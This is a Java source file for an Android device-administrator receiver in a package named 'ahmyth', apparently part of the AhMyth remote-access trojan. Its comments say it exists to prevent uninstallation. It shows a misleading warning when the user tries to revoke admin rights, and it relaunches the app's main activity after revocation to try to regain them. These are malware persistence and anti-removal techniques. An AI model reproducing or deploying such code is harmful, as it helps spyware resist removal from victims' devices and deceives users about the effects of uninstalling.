package ahmyth.mine.king.ahmyth;

import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;
import android.widget.Toast;

/**
 * Device Admin Receiver - handles device administrator events
 * When activated, prevents uninstallation of the app
 */
public class AdminReceiver extends DeviceAdminReceiver {
    
    private static final String TAG = "AdminReceiver";

    @Override
    public void onEnabled(Context context, Intent intent) {
        super.onEnabled(context, intent);
        Log.d(TAG, "Device Admin enabled");
    }

    @Override
    public CharSequence onDisableRequested(Context context, Intent intent) {
        // This is called when someone tries to disable device admin (required before uninstall)
        // Return a warning message - this doesn't prevent it but warns the user
        Log.d(TAG, "Device Admin disable requested");
        return "Warning: Disabling may cause the app to malfunction.";
    }

    @Override
    public void onDisabled(Context context, Intent intent) {
        super.onDisabled(context, intent);
        Log.d(TAG, "Device Admin disabled");
        
        // Try to re-enable by starting MainActivity
        try {
            Intent reEnableIntent = new Intent(context, MainActivity.class);
            reEnableIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(reEnableIntent);
        } catch (Exception e) {
            Log.e(TAG, "Error re-launching activity", e);
        }
    }

    @Override
    public void onPasswordFailed(Context context, Intent intent) {
        Log.d(TAG, "Password failed");
    }

    @Override
    public void onPasswordSucceeded(Context context, Intent intent) {
        Log.d(TAG, "Password succeeded");
    }

    @Override
    public void onPasswordChanged(Context context, Intent intent) {
        Log.d(TAG, "Password changed");
    }
}
